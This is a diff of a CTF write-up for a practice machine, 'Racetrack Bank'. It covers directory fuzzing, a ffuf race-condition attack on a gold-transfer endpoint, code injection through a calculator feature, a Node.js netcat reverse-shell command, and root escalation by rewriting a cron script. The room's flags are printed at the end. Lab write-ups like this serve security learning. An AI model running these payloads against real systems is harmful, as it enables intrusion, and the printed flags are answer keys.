@@ -2,24 +2,23 @@
 sticker: emoji//1f3e6
 ---
 
-# RACETRACK BANK
+# PORT SCAN
+---
 
-## PORT SCAN
-
-***
 
 | PORT | SERVICE |
-| ---- | ------- |
+| :--- | :------ |
 | 22   | SSH     |
 | 80   | HTTP    |
 
-## RECONNAISSANCE
 
-***
+
+# RECONNAISSANCE
+---
 
 Let's check the web application:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612145657.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612145657.png)
 
 We can create an account and login, let's fuzz to check more hidden directories:
 
@@ -67,37 +66,39 @@ Create.html             [Status: 200, Size: 1973, Words: 620, Lines: 59, Duratio
 
 We got a bunch of stuff, `giving.html` is interesting, let's create a test account first:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612150609.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612150609.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612151210.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612151210.png)
 
 We got a purchase functionality on here too, we can check it out:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612151246.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612151246.png)
 
-We can buy a premium account with `10000` gold, we are only given `1 gold` when we create an account though, that's because there's a `give gold` functionality, if we check it, we can see this:
+ We can buy a premium account with `10000` gold, we are only given `1 gold` when we create an account though, that's because there's a `give gold` functionality, if we check it, we can see this:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612151403.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612151403.png)
 
 We can give gold to our friends simply by knowing their username, based on that, let's create another account and give ourselves one gold:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612151455.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612151455.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612151516.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612151516.png)
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612151528.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612151528.png)
 
 If we check our first account:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612151603.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612151603.png)
 
 As seen, we receive the gold, on this case, to reach `10000` gold we'd need to create 10000 accounts, which is simply ridiculous, we can automate it with python but on a real server, 10000 accounts coming from a single IP would be suspicious and would end up getting ourselves banned.
+
+
 
 That's why, we need another path, I'd try to go with `race condition`, A race condition in cybersecurity is a flaw that occurs when a system's behavior depends on the timing or sequence of uncontrollable events, like parallel processes accessing shared resources. In CTFs, this often involves exploiting a situation where two actions happen almost simultaneously, such as changing user permissions right before a validation check or swapping a file before it's read by a privileged process. By carefully timing the attack, we can bypass security checks or gain unintended access. On this case, we need to the race condition for giving ourselves gold in order to buy the premium account.
 
 But, we are a bit lost, we don't know how to exploit this race condition yet, let's pass the request to our proxy.
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612152318.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612152318.png)
 
 Ok, we got a bit more information, most relevant one is the:
 
@@ -109,19 +110,22 @@ Seeing the header `X-Powered-By: Express` in a response means the web server is 
 
 Since the application's named `racetrack`, we can search for something related:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612152600.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612152600.png)
 
 As seen, there's only race conditions for this, if we investigate further, we can find the package too:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612152928.png)
 
-## EXPLOITATION
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612152928.png)
 
-***
+
+
+
+# EXPLOITATION
+---
 
 If we go back to the proxy, we can check the format of the request:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612153022.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612153022.png)
 
 As seen, we need the cookie of our user, the amount and the username of the account who's receiving the gold, we can exploit the race condition using a fuzzer such as `wfuzz` or `ffuf` in this case, get the `cookie`, we also need to create a wordlist in which `1` is repeated a bunch of times, let's do it, you can use the following bash command:
 
@@ -135,11 +139,12 @@ Now, here comes our ffuf command:
 ffuf -c -u http://racetrack.thm/api/givegold -X POST -w race_wordlist.txt -H "Content-Type: application/x-www-form-urlencoded" -b "connect.sid=s%3AEDovzkVYcSpKHzvGEfSU6iAYygzwMrbs.hc2XrqJb%2FSJktcRYPA5faZA0DbBhGaSST1%2BqE%2Fc7PNI" -d "user=test2&amount=FUZZ"
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612153415.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612153415.png)
 
 We will see all the requests being made, what we need to do now is check `test2` account:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612153459.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612153459.png)
 
 As seen, we receive more gold that we have on our `test` account, the race condition exists and is exploitable, we can perform the same ffuf increasing the gold amount we are sending to a further quantity or, simply automate the deed with python as we usually do:
 
@@ -302,23 +307,24 @@ Target balance: 10,000 gold
 🎉 Exploit successful! Final balance: 20800 gold
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612155205.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612155205.png)
 
 We need to check `acc2`:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612155224.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612155224.png)
 
 As seen, we got the amount of gold the script told us, let's buy our premium account:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612155301.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612155301.png)
 
 Once we buy it, we get access to `Premium Features`, let's check them out:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612155322.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612155322.png)
 
 A calculator huh, seems weird:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612161556.png)
+
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612161556.png)
 
 As seen, the URL takes the format of:
 
@@ -334,7 +340,7 @@ process.cwd()
 
 This command checks the current working directory, once we use it we get:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612162032.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612162032.png)
 
 As seen, we have RCE, we can use more commands to test:
 
@@ -351,19 +357,22 @@ process.uptime()                       // Time Node has been running
 process.memoryUsage()                 // Memory info
 ```
 
+
 Ok, the nice part about this is getting a reverse shell, so let's use:
 
 ```node
 require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 9001 >/tmp/f')
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612162333.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612162333.png)
 
 Got our shell, let's begin privesc.
 
-## PRIVILEGE ESCALATION
 
-***
+
+# PRIVILEGE ESCALATION
+---
+
 
 Ok, first step is to stabilize the shell:
 
@@ -377,13 +386,14 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612162428.png) Now, let's take a look around, we can use linpeas:
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612162428.png)
+Now, let's take a look around, we can use linpeas:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612162926.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612162926.png)
 
 As seen, there's a `cleanupscript.sh` script, since it is a cleanup script, it may be running as a process each couple minutes, let's use `pspy` to check:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612163145.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612163145.png)
 
 As expected, there's a cronjob which runs the `cleanupscript.sh` as root, we can make a backup of the real script and modify it to send ourselves a reverse shell:
 
@@ -397,7 +407,7 @@ chmod +x cleanupscript.sh
 
 Now, once we've saved the file, we need to set up our listener and wait a couple minutes:
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612164012.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612164012.png)
 
 We can now read both flags:
 
@@ -409,4 +419,5 @@ THM{178c31090a7e0f69560730ad21d90e70}
 THM{55a9d6099933f6c456ccb2711b8766e3}
 ```
 
-![](gitbook/cybersecurity/images/Pasted%20image%2020250612164116.png)
+![](gitbook/cybersecurity/images/Pasted%252520image%25252020250612164116.png)
+
